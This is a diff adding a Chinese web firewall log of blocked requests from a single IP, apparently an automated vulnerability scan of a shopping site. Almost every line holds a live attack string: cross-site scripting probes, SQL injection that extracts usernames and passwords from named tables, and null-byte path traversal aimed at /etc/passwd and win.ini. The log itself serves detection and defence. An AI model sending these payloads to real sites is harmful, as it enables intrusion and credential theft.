@@ -1,0 +1,89 @@
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:05 攻击出处:/pg.php 攻击方式: GET 详细信息: rss<script>alert(abc)</script>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:05 攻击出处:/search.php 攻击方式: POST 详细信息: 88888<script>alert(42873)</script>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:05 攻击出处:/search.php 攻击方式: POST 详细信息: 88888<img src=1 onerror=alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:05 攻击出处:/search.php 攻击方式: POST 详细信息: Goods<script>alert(42873)</script>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:05 攻击出处:/search.php 攻击方式: POST 详细信息: 88888<div style=width:expression(alert(42873))>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:06 攻击出处:/index.php 攻击方式: GET 详细信息: \'prompt(42873)\'bad=\">
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:06 攻击出处:/search.php 攻击方式: POST 详细信息: Goods<img src=1 onerror=alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:06 攻击出处:/search.php 攻击方式: POST 详细信息: Goods<div style=width:expression(alert(42873))>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:06 攻击出处:/index.php 攻击方式: GET 详细信息: <script>prompt(42873)</script>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:06 攻击出处:/search.php 攻击方式: POST 详细信息: showall<script>alert(42873)</script>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:06 攻击出处:/search.php 攻击方式: POST 详细信息: showall<img src=1 onerror=alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: showall<div style=width:expression(alert(42873))>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: 88888+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: 88888\" onmousemove=alert(42873) wb=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: Goods+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: Goods\" onmousemove=alert(42873) wb=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: Goods\" onmousemove=\'alert(42873)\'wb=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: Goods\" onmouseover=prompt(42873) bad=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: Goods<iframe SRC=javascript:alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/wap.php 攻击方式: GET 详细信息: <script>alert(42873)</script>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: Goods<body ONLOAD=alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: showall+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:07 攻击出处:/search.php 攻击方式: POST 详细信息: showall\" onmousemove=alert(42873) wb=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: Goods<EMBED SRC=javascript:alert(42873)></EMBED>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: Goods<BASE HREF=\"javascript:alert(42873);//\">
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: 88888\" onmousemove=\'alert(42873)\'wb=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: 88888\" onmouseover=prompt(42873) bad=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: 88888<iframe SRC=javascript:alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: 88888<body ONLOAD=alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/index.php 攻击方式: GET 详细信息: %27,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,table_name,0x27,0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/wap/index.php 攻击方式: GET 详细信息: and(select 1 from(select count(*),concat((select (select (select concat(0x27,0x7e,jishigou_members.username,0x27,0x7e,jishigou_members.password,0x27,0x7e) from jishigou_members where uid=1 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=Goods%00'
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: showall\" onmousemove=\'alert(42873)\'wb=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: showall\" onmouseover=prompt(42873) bad=\"
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: showall<iframe SRC=javascript:alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: showall<body ONLOAD=alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: 88888<EMBED SRC=javascript:alert(42873)></EMBED>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: 88888<BASE HREF=\"javascript:alert(42873);//\">
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: showall<EMBED SRC=javascript:alert(42873)></EMBED>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:08 攻击出处:/search.php 攻击方式: POST 详细信息: showall<BASE HREF=\"javascript:alert(42873);//\">
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/index.php 攻击方式: GET 详细信息: 2 union select 1,2,3,4,5,CONCAT(0x7c,username,0x7c,password,0x7c,CHAR(119,101,98,115,99,97,110)),7,8,9,10,11,12,13,14,15,16,17,18,19,20 from wiki_user where groupid=4 limit 1#
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../boot.ini%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../windows/win.ini%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=88888%00'
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../boot.ini%00.jpg
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../windows/win.ini%00.jpg
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=showall%00'
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../boot.ini%00.html
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:09 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../windows/win.ini%00.html
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../boot.ini%00.htm
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../windows/win.ini%00.htm
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../windows/win.ini%00.txt
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../etc/passwd%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=%00../../../../../../../../etc/passwd
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../etc/passwd%00.html
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&a=showall&m=../../../../../../../../etc/passwd%00.jpg
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../boot.ini%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../windows/win.ini%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:11 攻击出处:/index.php 攻击方式: POST 详细信息: 1 and 1=2 union select 1,2,3,4,5,6,7,8,concat 
+ 
+(0x245E,username,0x2D3E,userpass,0x5E24,0x7765627363616E74657374),10,11,12 
+ 
+,13,14,15,16,17,18,19,20,21,22 from sdb_operators
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:12 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../boot.ini%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:12 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../windows/win.ini%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:12 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../boot.ini%00.jpg
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:12 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../boot.ini%00.jpg
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:12 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../windows/win.ini%00.jpg
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:12 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../windows/win.ini%00.html
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:12 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../windows/win.ini%00.html
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:12 攻击出处:/search.php 攻击方式: POST 详细信息: +/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/index.php 攻击方式: GET 详细信息: %27,tags) or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,table_name,0x27,0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../boot.ini%00.htm
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../boot.ini%00.htm
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../windows/win.ini%00.htm
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../windows/win.ini%00.htm
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../windows/win.ini%00.txt
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../windows/win.ini%00.txt
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../etc/passwd%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../etc/passwd%00
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=%00../../../../../../../../etc/passwd
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:13 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../etc/passwd%00.html
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:14 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?m=Goods&a=showall&keywords=../../../../../../../../etc/passwd%00.jpg
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:14 攻击出处:/search.php 攻击方式: POST 详细信息: http://0750.tuanzhang.cc/search.php?keywords=88888&m=Goods&a=../../../../../../../../etc/passwd%00.html
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:14 攻击出处:/index.php 攻击方式: GET 详细信息: /people/ajax/user_actions/uid-1__actions-1)_AND_(SELECT_1_FROM(SELECT_COUNT(*),CONCAT(sha1(0x3336307765627363616e),(SELECT_(CASE_WHEN_(8274
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:15 攻击出处:/index.php 攻击方式: GET 详细信息: a:1:{s:3:\"k26\";a:2:{s:3:\"did\";s:204:\"26) and (select 1 from(select count(*),concat((select (select password from mysql.user limit 0,1) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#\";s:6:\"amount\";i:42;}}
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:16 攻击出处:/search.php 攻击方式: POST 详细信息: +/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:16 攻击出处:/pg.php 攻击方式: GET 详细信息: rss<img src=1 onerror=alert(42873)>
+已拦截-IP: 182.118.33.6 拦截时间: 2014-07-29 08:36:16 攻击出处:/pg.php 攻击方式: GET 详细信息: rss<div style=width:expression(alert(42873))>
